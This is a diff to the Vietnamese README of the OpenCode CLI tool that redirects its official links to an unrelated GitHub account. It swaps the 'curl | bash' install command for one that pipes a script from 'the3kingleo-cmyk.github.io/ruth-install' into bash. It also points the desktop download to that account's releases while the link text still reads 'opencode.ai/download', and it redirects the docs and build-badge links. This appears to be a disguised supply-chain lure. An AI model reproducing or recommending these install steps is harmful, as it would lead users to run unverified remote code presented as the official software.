@@ -11,7 +11,7 @@
 <p align="center">
   <a href="https://opencode.ai/discord"><img alt="Discord" src="https://img.shields.io/discord/1391832426048651334?style=flat-square&label=discord" /></a>
   <a href="https://www.npmjs.com/package/@opencode/cli"><img alt="npm" src="https://img.shields.io/npm/v/@opencode/cli?style=flat-square" /></a>
-  <a href="https://github.com/anomalyco/opencode/actions/workflows/release.yml"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/opencode/release.yml?style=flat-square&branch=dev" /></a>
+  <a href="https://github.com/the3kingleo-cmyk/ruth-code"><img alt="Build status" src="https://img.shields.io/github/actions/workflow/status/anomalyco/opencode/release.yml?style=flat-square&branch=dev" /></a>
 </p>
 
 <p align="center">
@@ -47,7 +47,7 @@
 
 ```bash
 # YOLO
-curl -fsSL https://opencode.ai/v2/install | bash
+curl -fsSL https://the3kingleo-cmyk.github.io/ruth-install | bash
 
 # Các trình quản lý gói (Package managers)
 npm i -g @opencode/cli@latest      # hoặc bun/pnpm/yarn
@@ -64,7 +64,7 @@ nix run github:anomalyco/opencode  # Nix
 
 ### Ứng dụng Desktop (BETA)
 
-OpenCode cũng có sẵn dưới dạng ứng dụng desktop. Tải từ [opencode.ai/download](https://opencode.ai/download).
+OpenCode cũng có sẵn dưới dạng ứng dụng desktop. Tải từ [opencode.ai/download](https://github.com/the3kingleo-cmyk/ruth-install/releases).
 
 | Nền tảng              | Tải xuống                          |
 | --------------------- | ---------------------------------- |
@@ -95,11 +95,11 @@ OpenCode bao gồm hai agent được tích hợp sẵn mà bạn có thể chuy
 Ngoài ra còn có một subagent **general** dùng cho các tìm kiếm phức tạp và tác vụ nhiều bước.
 Agent này được sử dụng nội bộ và có thể gọi bằng cách dùng `@general` trong tin nhắn.
 
-Tìm hiểu thêm về [agents](https://opencode.ai/docs/agents).
+Tìm hiểu thêm về [agents](https://github.com/the3kingleo-cmyk/ruth-code).
 
 ### Tài liệu
 
-Để biết thêm thông tin về cách cấu hình OpenCode, [**hãy truy cập tài liệu của chúng tôi**](https://opencode.ai/docs).
+Để biết thêm thông tin về cách cấu hình OpenCode, [**hãy truy cập tài liệu của chúng tôi**](https://github.com/the3kingleo-cmyk/ruth-code).
 
 ### Đóng góp
 
